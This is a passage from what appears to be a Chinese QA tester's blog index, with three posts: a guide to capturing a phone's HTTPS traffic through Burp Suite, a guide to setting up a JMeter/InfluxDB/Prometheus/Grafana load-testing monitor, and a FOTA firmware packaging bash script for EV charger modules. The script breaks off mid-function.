Burpsuite配置 Proxy-Options中点击Add添加一个Proxy监听器，端口随意，指定地址为电脑的网卡ip，OK保存 浏览器打开设置的ip+端口号，点击右上角的CA Certificate导出证书 可以看到上一步中导出的证书为der格式，接下来需要使用openssl工具进行格式转换 windows下使用openssl工具比较繁琐，需要下载解压配置环境变量，如果有linux环境的话会方便许多，因为大多数的linux发行版本都会自带openssl工具 如下图，我已经将der证书放入/opt/目录下，接下来开始格式转换openssl x509 -inform der -in cacert.der -out cacert.pem # 将der证书转换为pem openssl x509 -subject_hash_old -in cacert.pem # 查看hash标识 把cacert.pem拷到本地，重命名为&quot;9a5ba575.0&quot; 把证书文件&quot;9a5ba575.0&quot;复制到手机的系统证书目录，设置权限644 不使用MT管理器的话，也可以直接adb push adb push 9a5ba575.0 /system/etc/security/cacerts # 移动 adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0 #设置权限 设置wlan代理 在手机的wlan设置中设置代理地址和端口为步骤1中的ip和端口 开始抓包 已经可以成功抓到手机的https请求和小程序中的https请求 如果手机浏览器打开网页出现下面的提示就说明示证书没有设置好，检查步骤3 ","link":"https://hellogu.github.io/post/an-zhuo-wei-xin-xiao-cheng-xu-zhua-bao/"},{"title":"Jmeter+influxDB+prometheus+grafana压测框架","content":"压测监控平台从0到1 实现原理 influxDB存储jmeter结果数据，prometheus采集服务器数据，通过grafana展示 框架优点 可通过grafana面板实时监控服务器状态，压测完成后可通过两个数据面板定位问题 搭建过程 windows下安装influxDB与grafana 1.InfluxDB安装 进入InfluxDB官网下载influxDB 解压后如图 双击influxd.exe启动数据库 双击influx.exe进入influxdb客户端，进入后创建名字为“jmeter”的数据库 create database jmeter show databases 2.grafana安装 进入grafana官网下载安装包 解压后如图 解压后进入bin目录点击grafana-server.exe启动 启动后浏览器输入http://127.0.0.1:3000/ 登录grafana后台，默认用户密码都是admin 添加数据源，选择InfluxDB 填入数据库地址，数据库名 添加完成后 然后进入Dashboard页面，点击import导入面板，可以直接输入ID导入 3.jmeter配置 添加“监听器 -&gt; 后端监听器” 配置后端监听器，把jmeter的结果存入influxdb数据库 4.监控服务器prometheus配置 从 https://prometheus.io/download/ 下载相应版本，放到到服务器上。（我这边部署在了WSL中） # 解压安装包 tar -zxvf prometheus-2.51.1.linux-amd64.tar.gz -C /usr/local/ # 进入解压目录进行重命名 cd /usr/local/ mv prometheus-2.38.0.linux-amd64/ prometheus # 进入prometheus目录下 cd /usr/local/prometheus/ # 编写启动脚本 echo ' ./prometheus --config.file=./prometheus.yml &amp;' &gt; start.sh &amp;&amp; chmod +x start.sh # 编写停止脚本 echo ' pkill prometheus' &gt; stop.sh &amp;&amp; chmod +x stop.sh # 确认是否正常启动（默认端口9090） [root@localhost prometheus]# netstat -ntlp | grep 9090 tcp6 0 0 :::9090 :::* LISTEN 31022/./prometheus [root@localhost prometheus]# 浏览器访问：ip:9090 访问到prometheus的主界面(我这边是WSL部署的，所以是个172.的桥接的ip) 点击Status—&gt;Targets—&gt;就可以看到监控的本机（下面的192.168.123.157就是被压测的应用部署的服务器） 5.被测服务器部署node_exporter组件 服务器ip：192.168.123.157 下载node_exporter组件拷贝到服务器上解压 # 解压安装包 tar -zxvf node_exporter-1.7.0.linux-arm64.tar.gz -C /usr/local/ # 进入解压目录进行重命名 cd /usr/local/ mv node_exporter-1.2.2.linux-amd64/ node_exporter # 进入node_exporter目录下 cd /usr/local/node_exporter/ # 编写启动脚本 echo ' ./node_exporter &amp;' &gt; start.sh &amp;&amp; chmod +x start.sh # 编写停止脚本 echo ' pkill node_exporter ' &gt; stop.sh &amp;&amp; chmod +x stop.sh # 确认是否正常启动（默认端口9100） [root@localhost node_exporter]# netstat -ntlp | grep 9100 tcp6 0 0 :::9100 :::* LISTEN 31115/./node_export [root@localhost node_exporter]# 浏览器打开http://192.168.123.157:9100/ 查看node_exporter是否正常 6.配置prometheus.yml(在监控机prometheus中添加被监控机) 在prometheus.yml最后一行添加被监控机的ip 回到prometheus的web管理页查看target中的被监控机状态 7.grafana导入被监控机状态监控面板 和步骤2中的添加数据源、导入面板操作类似 导入面板的ID为8919 导入后查看Dashboard 参考文章： JMeter+Grafana+Influxdb搭建可视化性能测试监控平台 0基础搭建Prometheus+Grafana监控服务器CPU、磁盘、内存等信息 ","link":"https://hellogu.github.io/post/jmeterinfluxdbprometheusgrafana-ya-ce-kuang-jia/"},{"title":"自动FOTA打包脚本","content":"充电桩共包含10多个模块，以往每次释放正式版本都需要测试人员手动重复打包10多次，通过该 shell 脚本，只需要输入选项即可对特定的模块或者所有模块进行打包操作，减少重复动作，简化版本发布流程 已完成的功能 提供菜单供测试人员选择常见的几种打包规则 已实现所有ECU的打包功能 待优化的功能(公司倒闭，不用优化了🤡) 判断测试人员上传的bin和hex升级包是否有缺失并作出对应提示 优化程序的判断逻辑，目前只是简单的将所有打包步骤写成方法，导致大量重复代码 程序运行演示 具体实现 #!/bin/bash # 创建FotaPackageTool工作目录 funCreateDir(){ if [ -d &quot;./FotaPackageTool&quot; ]; then echo &quot;已有FotaPackageTool工作目录&quot; &gt;&gt; ./FotaPackageTool/package.log else mkdir FotaPackageTool echo &quot;已创建FotaPackageTool工作目录&quot; &gt;&gt; ./FotaPackageTool/package.log fi if [ -d &quot;./FotaPackageTool/binfiles&quot; ]; then echo &quot;已有FotaPackageTool/binfiles bin文件转存目录&quot; &gt;&gt; ./FotaPackageTool/package.log else mkdir FotaPackageTool/binfiles echo &quot;已创建FotaPackageTool/binfiles bin文件转存目录&quot; &gt;&gt; ./FotaPackageTool/package.log fi if [ -d &quot;./FotaPackageTool/module_tmp&quot; ]; then echo &quot;已有FotaPackageTool/module_tmp hex,s19文件转存目录&quot; &gt;&gt; ./FotaPackageTool/package.log else mkdir FotaPackageTool/module_tmp echo &quot;已创建FotaPackageTool/module_tmp hex,s19文件转存目录&quot; &gt;&gt; ./FotaPackageTool/package.log fi } # 清空module文件夹 funClearModule(){ echo &quot;开始清空module目录&quot; &gt;&gt; ./FotaPackageTool/package.log rm -rf ./module/* } # 清空./FotaPackageTool/binfiles中转文件夹 funClearBinfiles(){ echo &quot;开始清空./FotaPackageTool/binfiles中转文件夹&quot; &gt;&gt; ./FotaPackageTool/package.log rm -rf ./FotaPackageTool/binfiles/* } # 清空FotaPackageTool文件夹里的旧包 funClearOldFotaPackage(){ echo &quot;开始清空module目录&quot; &gt;&gt; ./FotaPackageTool/package.log rm -rf ./FotaPackageTool/*.gz } # 转移.bin文件到中转目录 funMoveBin(){ mv ./module/*.bin ./FotaPackageTool/binfiles/ } # 转移TBOX1.zip文件到中转目录 funMoveZip(){ mv ./module/*.zip ./FotaPackageTool/binfiles/ } # 转移TBox2.tar.gz文件到中转目录 funMoveGz(){ mv ./module/*.tar.gz ./FotaPackageTool/binfiles/ } # 转移HMI.tar文件到中转目录 funMoveTar(){ mv ./module/*.tar ./FotaPackageTool/binfiles/ } #更新release-time funUpdatePackageTime(){ echo &quot;开始填充release-time&quot; &gt;&gt; ./FotaPackageTool/package.log # 获取当前时间 releasetime=$(date -u +&quot;%Y-%m-%dT%H:%M:%SZ&quot;) # 替换文件中的引号内内容 sed -i 's/release-time = &quot;[^&quot;]*&quot;/release-time = &quot;'&quot;${releasetime}&quot;'&quot;/g' ./FotaPackageTool/config_fota.bak } #打包HMI funPackageHMI(){ echo &quot;开始打包HMI&quot; &gt;&gt; ./FotaPackageTool/package.log # 将TB2.tar.gz文件拷贝到module文件夹 cp ./FotaPackageTool/module_tmp/hmi*.tar ./module/ # 将module文件夹里的以TB2*.tar.gz结尾的文件名存成变量 hmi_tar_file=$(cd ./module &amp;&amp; ls hmi*.tar) # 拷贝一次空的config_fota文件，写入CCU版本的文件名 cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/ad-video = \\&quot;\\&quot;/ad-video = \\&quot;$hmi_tar_file\\&quot;/g&quot; config_fota.txt # 执行打包命令并等待&quot;FOTA打包已创建成功&quot;的日志出现 echo &quot;执行FOTA打包命令&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_HMI.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_HMI.log; then echo &quot;捕捉到ics_fota_HMI日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 获取OUTPUT文件夹中最新生成的文件夹名 latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # 获取config_fota.txt中的系统版本号 SW_Version=$(cat config_fota.txt |grep 系统版本号|awk '{print $3}'|sed 's/\\&quot;//g') # 将OUTPUT中最新的文件夹内的*.FOTA.tar.gz拷贝到FotaPackageOutput文件夹中并改名 echo &quot;将($latest_dir)中的FOTA包移动到FotaPackageTool目录&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_HMI.tar.gz unset latest_dir } # 打包TBOX1 funPackageTBOX1(){ echo &quot;开始打包TBox1&quot; &gt;&gt; ./FotaPackageTool/package.log # 将MCU1.hex文件拷贝到module文件夹 cp ./FotaPackageTool/module_tmp/MCU1*.hex ./module/ # 执行ics_fota命令 echo &quot;开始生成TBOX1.bin文件&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_MCU.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_MCU.log; then echo &quot;捕捉到ics_fota_MCU日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 将module文件夹里的以.bin结尾的文件名存成变量 mcu_bin_file1=$(cd ./module &amp;&amp; ls TBOX1*.bin) # 将TBOX1的update.zip拷贝到module目录 cp ./FotaPackageTool/module_tmp/update.zip ./module mpu_zip_file=$(cd ./module &amp;&amp; ls update.zip) # 拷贝一次空的config_fota文件，写入MCU版本的文件名 cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/TBOX1-MPU = \\&quot;\\&quot;/TBOX1-MPU = \\&quot;$mpu_zip_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX1-MCU = \\&quot;\\&quot;/TBOX1-MCU = \\&quot;$mcu_bin_file1\\&quot;/g&quot; config_fota.txt # 生成bin文件后，指定config_fota文件第二次打包 echo &quot;开始指定.bin文件生成FOTA包&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_TBOX1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_TBOX1.log; then echo &quot;捕捉到ics_fota_TBOX1日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 获取OUTPUT文件夹中最新生成的文件夹名 latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # 获取config_fota.txt中的系统版本号 SW_Version=$(cat config_fota.txt |grep 系统版本号|awk '{print $3}'|sed 's/\\&quot;//g') # 将OUTPUT中最新的文件夹内的*.FOTA.tar.gz拷贝到FotaPackageOutput文件夹中并改名 echo &quot;将($latest_dir)中的FOTA包移动到FotaPackageTool目录&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_TBOX1.tar.gz unset latest_dir } # 打包TBOX2 funPackageTBOX2(){ echo &quot;开始打包TBOX2&quot; &gt;&gt; ./FotaPackageTool/package.log # 将TB2.tar.gz文件拷贝到module文件夹 cp ./FotaPackageTool/module_tmp/TB2*.tar.gz ./module/ # 将module文件夹里的以TB2*.tar.gz结尾的文件名存成变量 tbox2_tar_file=$(cd ./module &amp;&amp; ls TB2*.tar.gz) # 拷贝一次空的config_fota文件，写入CCU版本的文件名 cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/TBOX2-MPU = \\&quot;\\&quot;/TBOX2-MPU = \\&quot;$tbox2_tar_file\\&quot;/g&quot; config_fota.txt # 生成bin文件后，指定config_fota文件第二次打包 ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_TBOX2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_TBOX2.log; then echo &quot;捕捉到ics_fota_TBOX2日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 获取OUTPUT文件夹中最新生成的文件夹名 latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # 获取config_fota.txt中的系统版本号 SW_Version=$(cat config_fota.txt |grep 系统版本号|awk '{print $3}'|sed 's/\\&quot;//g') # 将OUTPUT中最新的文件夹内的*.FOTA.tar.gz拷贝到FotaPackageOutput文件夹中并改名 echo &quot;将($latest_dir)中的FOTA包移动到FotaPackageTool目录&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_TBOX2.tar.gz unset latest_dir } # 打包CCU funPackageCCU(){ echo &quot;开始打包CCU&quot; &gt;&gt; ./FotaPackageTool/package.log # 将ccu.s19文件拷贝到module文件夹 cp ./FotaPackageTool/module_tmp/CCU*.s19 ./module/ # 执行ics_fota命令 echo &quot;开始生成.bin文件&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_CCU_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_CCU_1.log; then echo &quot;捕捉到ics_fota_CCU_1日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 将module文件夹里的以.bin结尾的文件名存成变量 ccu_bin_file1=$(cd ./module &amp;&amp; ls CCU1*.bin) ccu_bin_file2=$(cd ./module &amp;&amp; ls CCU2*.bin) # 拷贝一次空的config_fota文件，写入CCU版本的文件名 cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/CCU1 = \\&quot;\\&quot;/CCU1 = \\&quot;$ccu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU2 = \\&quot;\\&quot;/CCU2 = \\&quot;$ccu_bin_file2\\&quot;/g&quot; config_fota.txt # 生成bin文件后，指定config_fota文件第二次打包 ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_CCU_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_CCU_2.log; then echo &quot;捕捉到ics_fota_CCU_2日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 获取OUTPUT文件夹中最新生成的文件夹名 latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # 获取config_fota.txt中的系统版本号 SW_Version=$(cat config_fota.txt |grep 系统版本号|awk '{print $3}'|sed 's/\\&quot;//g') # 将OUTPUT中最新的文件夹内的*.FOTA.tar.gz拷贝到FotaPackageOutput文件夹中并改名 echo &quot;将($latest_dir)中的FOTA包移动到FotaPackageTool目录&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_CCU.tar.gz unset latest_dir } # 打包SECC funPackageSECC(){ echo &quot;开始打包SECC&quot; &gt;&gt; ./FotaPackageTool/package.log # 将secc.s19文件拷贝到module文件夹 cp ./FotaPackageTool/module_tmp/SECC*.s19 ./module/ # 执行ics_fota命令 echo &quot;开始生成.bin文件&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_SECC_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_SECC_1.log; then echo &quot;捕捉到ics_fota_SECC_1日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 将module文件夹里的以.bin结尾的文件名存成变量 secc_bin_file1=$(cd ./module &amp;&amp; ls SECC1*.bin) secc_bin_file2=$(cd ./module &amp;&amp; ls SECC2*.bin) # 拷贝一次空的config_fota文件，写入CCU版本的文件名 cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/SECC1 = \\&quot;\\&quot;/SECC1 = \\&quot;$secc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC2 = \\&quot;\\&quot;/SECC2 = \\&quot;$secc_bin_file2\\&quot;/g&quot; config_fota.txt # 生成bin文件后，指定config_fota文件第二次打包 ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_SECC_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_SECC_2.log; then echo &quot;捕捉到ics_fota_SECC_2日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 获取OUTPUT文件夹中最新生成的文件夹名 latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # 获取config_fota.txt中的系统版本号 SW_Version=$(cat config_fota.txt |grep 系统版本号|awk '{print $3}'|sed 's/\\&quot;//g') # 将OUTPUT中最新的文件夹内的*.FOTA.tar.gz拷贝到FotaPackageOutput文件夹中并改名 echo &quot;将($latest_dir)中的FOTA包移动到FotaPackageTool目录&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_SECC.tar.gz unset latest_dir } # 打包HCU funPackageHCU(){ echo &quot;开始打包HCU&quot; &gt;&gt; ./FotaPackageTool/package.log # 将AFC.hex文件拷贝到module文件夹 cp ./FotaPackageTool/module_tmp/AFC*.hex ./module/ # 执行ics_fota命令 echo &quot;开始生成.bin文件&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_HCU_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_HCU_1.log; then echo &quot;捕捉到ics_fota_HCU_1日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 将module文件夹里的以.bin结尾的文件名存成变量 hcu_bin_file1=$(cd ./module &amp;&amp; ls HCU*.bin) # 拷贝一次空的config_fota文件，写入CCU版本的文件名 cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/HCU = \\&quot;\\&quot;/HCU = \\&quot;$hcu_bin_file1\\&quot;/g&quot; config_fota.txt # 生成bin文件后，指定config_fota文件第二次打包 ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_HCU_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_HCU_2.log; then echo &quot;捕捉到ics_fota_HCU_2日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 获取OUTPUT文件夹中最新生成的文件夹名 latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # 获取config_fota.txt中的系统版本号 SW_Version=$(cat config_fota.txt |grep 系统版本号|awk '{print $3}'|sed 's/\\&quot;//g') # 将OUTPUT中最新的文件夹内的*.FOTA.tar.gz拷贝到FotaPackageOutput文件夹中并改名 echo &quot;将($latest_dir)中的FOTA包移动到FotaPackageTool目录&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_HCU.tar.gz unset latest_dir } # 打包DCDC和ACDC funPackagePM(){ echo &quot;开始打包DCDC和ACDC&quot; &gt;&gt; ./FotaPackageTool/package.log # 将ac*.hex和dc*.hex文件拷贝到module文件夹 cp ./FotaPackageTool/module_tmp/AC*.hex ./module/ cp ./FotaPackageTool/module_tmp/DC*.hex ./module/ # 执行ics_fota命令 echo &quot;开始生成.bin文件&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_PM_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_PM_1.log; then echo &quot;捕捉到ics_fota_PM_1日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 将module文件夹里的以.bin结尾的文件名存成变量 dc_bin_file1=$(cd ./module &amp;&amp; ls DCDC1*.bin) dc_bin_file2=$(cd ./module &amp;&amp; ls DCDC2*.bin) dc_bin_file3=$(cd ./module &amp;&amp; ls DCDC3*.bin) dc_bin_file4=$(cd ./module &amp;&amp; ls DCDC4*.bin) ac_bin_file1=$(cd ./module &amp;&amp; ls ACDC1*.bin) ac_bin_file2=$(cd ./module &amp;&amp; ls ACDC2*.bin) # 拷贝一次空的config_fota文件，写入CCU版本的文件名 cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/DCCC1 = \\&quot;\\&quot;/DCCC1 = \\&quot;$dc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCCC2 = \\&quot;\\&quot;/DCCC2 = \\&quot;$dc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCCC3 = \\&quot;\\&quot;/DCCC3 = \\&quot;$dc_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCCC4 = \\&quot;\\&quot;/DCCC4 = \\&quot;$dc_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACCC1 = \\&quot;\\&quot;/ACCC1 = \\&quot;$ac_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACCC2 = \\&quot;\\&quot;/ACCC2 = \\&quot;$ac_bin_file2\\&quot;/g&quot; config_fota.txt # 生成bin文件后，指定config_fota文件第二次打包 ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_PM_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_PM_2.log; then echo &quot;捕捉到ics_fota_PM_2日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 获取OUTPUT文件夹中最新生成的文件夹名 latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # 获取config_fota.txt中的系统版本号 SW_Version=$(cat config_fota.txt |grep 系统版本号|awk '{print $3}'|sed 's/\\&quot;//g') # 将OUTPUT中最新的文件夹内的*.FOTA.tar.gz拷贝到FotaPackageOutput文件夹中并改名 echo &quot;将($latest_dir)中的FOTA包移动到FotaPackageTool目录&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_PM.tar.gz unset latest_dir } # 打包CMU funPackageCMU(){ echo &quot;开始打包CMU&quot; &gt;&gt; ./FotaPackageTool/package.log # 将cmu.hex文件拷贝到module文件夹 cp ./FotaPackageTool/module_tmp/CMU*.hex ./module/ # 执行ics_fota命令 echo &quot;开始生成.bin文件&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_CMU_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_CMU_1.log; then echo &quot;捕捉到ics_fota_CMU_1日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 将module文件夹里的以.bin结尾的文件名存成变量 cmu_bin_file1=$(cd ./module &amp;&amp; ls CMU1*.bin) cmu_bin_file2=$(cd ./module &amp;&amp; ls CMU2*.bin) cmu_bin_file3=$(cd ./module &amp;&amp; ls CMU3*.bin) cmu_bin_file4=$(cd ./module &amp;&amp; ls CMU4*.bin) # 拷贝一次空的config_fota文件，写入CCU版本的文件名 cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/CMU1 = \\&quot;\\&quot;/CMU1 = \\&quot;$cmu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU2 = \\&quot;\\&quot;/CMU2 = \\&quot;$cmu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU3 = \\&quot;\\&quot;/CMU3 = \\&quot;$cmu_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU4 = \\&quot;\\&quot;/CMU4 = \\&quot;$cmu_bin_file4\\&quot;/g&quot; config_fota.txt # 生成bin文件后，指定config_fota文件第二次打包 ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_CMU_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_CMU_2.log; then echo &quot;捕捉到ics_fota_CMU_2日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 获取OUTPUT文件夹中最新生成的文件夹名 latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # 获取config_fota.txt中的系统版本号 SW_Version=$(cat config_fota.txt |grep 系统版本号|awk '{print $3}'|sed 's/\\&quot;//g') # 将OUTPUT中最新的文件夹内的*.FOTA.tar.gz拷贝到FotaPackageOutput文件夹中并改名 echo &quot;将($latest_dir)中的FOTA包移动到FotaPackageTool目录&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_CMU.tar.gz unset latest_dir } # 打包BMS funPackageBMS(){ echo &quot;开始打包EMS&quot; &gt;&gt; ./FotaPackageTool/package.log # 将bmu.s19文件拷贝到module文件夹 cp ./FotaPackageTool/module_tmp/BMU*.s19 ./module/ # 执行ics_fota命令 echo &quot;开始生成.bin文件&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_BMS_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_BMS_1.log; then echo &quot;捕捉到ics_fota_BMS_1日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 将module文件夹里的以.bin结尾的文件名存成变量 bms_bin_file1=$(cd ./module &amp;&amp; ls BMS1*.bin) bms_bin_file2=$(cd ./module &amp;&amp; ls BMS2*.bin) # 拷贝一次空的config_fota文件，写入CCU版本的文件名 cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/BMS1 = \\&quot;\\&quot;/BMS1 = \\&quot;$bms_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS2 = \\&quot;\\&quot;/BMS2 = \\&quot;$bms_bin_file2\\&quot;/g&quot; config_fota.txt # 生成bin文件后，指定config_fota文件第二次打包 ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_BMS_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTA打包已创建成功&quot; ./FotaPackageTool/ics_fota_BMS_2.log; then echo &quot;捕捉到ics_fota_BMS_2日志中出现'FOTA打包已创建成功'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # 获取OUTPUT文件夹中最新生成的文件夹名 latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # 获取config_fota.txt中的系统版本号 SW_Version=$(cat config_fota.txt |grep 系统版本号|awk '{print $3}'|sed 's/\\&quot;//g') # 将OUTPUT中最新的文件夹内的*.FOTA.tar.gz拷贝到FotaPackageOutput文件夹中并改名 echo &quot;将($latest_dir)中的FOTA包移动到FotaPackageTool目录&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_BMS.tar.gz unset latest_dir } # 打包EMS funPackageEMS(){ echo &quot;开始打包BMS&quot; &gt;&gt; ./FotaPackageTool/package.log # 将bmu.s19文件拷贝到module文件夹 cp ./FotaPackageTool/module_tmp/EMS*.s19 ./module/ # 执行ics_fota命令 echo &quot;开始生成.bin文件&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto 